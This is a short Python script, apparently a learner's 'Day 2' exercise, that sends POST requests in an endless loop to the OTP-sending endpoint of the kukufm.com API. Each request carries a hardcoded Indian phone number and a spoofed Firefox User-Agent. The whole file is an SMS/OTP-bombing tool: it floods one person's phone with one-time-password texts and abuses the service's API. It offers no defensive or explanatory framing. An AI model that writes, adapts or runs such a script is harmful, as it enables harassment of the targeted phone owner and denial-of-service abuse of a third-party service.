#!/usr/bin/python3

#   Day 2       Date : 10/06/24

import requests as rr

while True :

    url = "https://kukufm.com/api/v1/users/auth/send-otp/"

    header ={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'}


    payload = '{"phone_number":"+918483813266"}'

    data = rr.post(url , data = payload , headers=header , timeout=20)

    print (data.status_code)

#print (data.text)

